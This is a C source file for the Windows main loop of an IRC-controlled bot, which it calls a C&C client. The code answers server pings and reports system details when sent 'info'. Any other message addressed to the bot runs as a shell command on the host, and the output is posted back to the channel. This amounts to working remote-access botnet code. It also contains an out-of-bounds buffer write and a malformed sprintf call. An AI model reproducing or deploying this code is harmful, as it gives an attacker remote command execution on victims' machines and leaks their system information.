/*	et_main_loop_nix.c
	Author: William Woodruff
	------------------------
	The primary function used by et to send/receive data on Windows.
*/

#include "../cnc_info.h"
#include <string.h>
#include <stdio.h>
#include <windows.h>

/*	et_main_loop_win
	The main loop called by et_win.c to communicate with the IRC C&C server.
	arg: SOCKET socket, the winsock to write to/read from.
	arg: char *nick, the string containing the IRC nickname
*/
void et_main_loop_win(SOCKET socket, char *nick)
{
	char buf[1024];

	while(1)
	{
		recv(socket, buf, 1023, 0);
		buf[1024] = '\0';

		char *ping;
		if ((ping = strstr(buf, "PING")) && !(strstr(buf, "CASEMAPPING")))
		{
			char *pong = strtok(ping, "\r\n");
			strncpy(pong, "PONG", 4);
			send(socket, pong, strlen(pong), 0);
		}
		else if (strstr(buf, "PRIVMSG") && strstr(buf, nick))
		{
			char *line = strtok(buf, "\r\n");
			char *cmd = strrchr(line, ':');
			cmd++;

			if (!strcmp(cmd, "quit"))
			{
				break; /* back to main@et_win.c */
			}
			else if (!strcmp(cmd, "info"))
			{
				char os[256];
				char kern[256];

				#if defined(NTDDI_WIN7)
					sprintf(os, "PRIVMSG %s :OS: Microsoft Windows 7\r\n", IRC_CHANNEL);
				#elif defined(NTDDI_WIN8)
					sprintf(os, "PRIVMSG %s :OS: Microsoft Windows 8\r\n", IRC_CHANNEL);
				#elif defined(NTDDI_WINBLUE)
					sprintf(os, "PRIVMSG %s :OS: Microsoft Windows 8.1\r\n", IRC_CHANNEL);
				#elif defined(NTDDI_VISTA) || defined(NTDDI_VISTASP1)
					sprintf(os, "PRIVMSG %s :OS: Microsoft Windows Vista\r\n", IRC_CHANNEL);
				#elif defined(NTDDI_WINXP) || defined(NTDDI_WINXPSP1) || defined(NTDDI_WINXPSP2) || defined(NTDDI_WINXPSP3)
					sprintf(os, "PRIVMSG %s :OS: Microsoft Windows XP\r\n", IRC_CHANNEL);
				#else
					sprintf(os, "Microsoft Windows", 256);
				#endif

				OSVERSIONINFO kern_info;
				kern_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
				GetVersionEx(&kern_info);
				sprintf(kern, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);

				send(socket, os, strlen(os), 0);
				send(socket, kern, strlen(kern), 0);
			}
			else
			{
				char cmd_output[512];
				char cmd_message[1024];

				FILE *output_file = _popen(cmd, "rt");
				fgets(cmd_output, 512, output_file);
				sprintf(cmd_message, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
				send(socket, cmd_message, strlen(cmd_message), 0);
				_pclose(output_file);
			}
		}
	}
}